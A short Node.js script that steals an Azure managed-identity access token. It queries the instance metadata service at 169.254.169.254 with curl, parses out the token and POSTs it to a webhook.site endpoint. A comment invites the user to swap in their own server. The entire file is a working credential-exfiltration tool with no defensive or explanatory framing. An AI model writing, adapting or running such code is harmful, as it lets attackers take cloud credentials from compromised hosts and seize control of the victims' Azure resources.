const https = require('https');
const { exec } = require('child_process');

// Fetch the access token from Azure Metadata service
exec("curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/'", (error, stdout, stderr) => {
    if (error) {
        console.error(`Error fetching token: ${error}`);
        return;
    }
    
    // Parse the response to extract the access token
    const tokenResponse = JSON.parse(stdout);
    const accessToken = tokenResponse.access_token;
    
    // Send the access token to a remote server
    const data = JSON.stringify({
        token: accessToken
    });

    const options = {
        hostname: 'webhook.site', // Replace with your own server or testing service like webhook.site
        path: '/your-webhook-path',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        console.log(`Status: ${res.statusCode}`);
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    // Write data to request body
    req.write(data);
    req.end();
});
